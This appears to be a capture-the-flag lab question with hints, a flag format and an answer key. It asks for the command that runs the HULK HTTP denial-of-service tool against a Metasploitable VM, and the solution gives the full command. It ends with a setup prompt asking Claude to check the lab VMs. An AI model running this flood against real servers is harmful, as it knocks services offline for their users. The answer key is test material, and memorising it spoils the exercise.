# Q147 — HULK HTTP DoS

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / external |
| **Domain** | 09 — DoS / 08 — Social Eng / 10 — Session Hijacking / Recon |
| **Difficulty** | 🟢 Easy |
| **Tools** | `hping3`, `hulk`, `setoolkit`, `bettercap`, `shodan` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Run HULK against Metasploitable port 80. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=python3 hulk.py http://192.168.52.129/`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

HULK is a Python HTTP DoS tool.
</details>

<details>
<summary>Hint 2</summary>

GitHub: grafov/hulk.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
python3 hulk.py http://192.168.52.129/
```

Saturates Apache with random GETs.

**Answer:** `cmd=python3 hulk.py http://192.168.52.129/`

📖 Ref: [tools/hulk.md](../../tools/hulk.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q147".
```
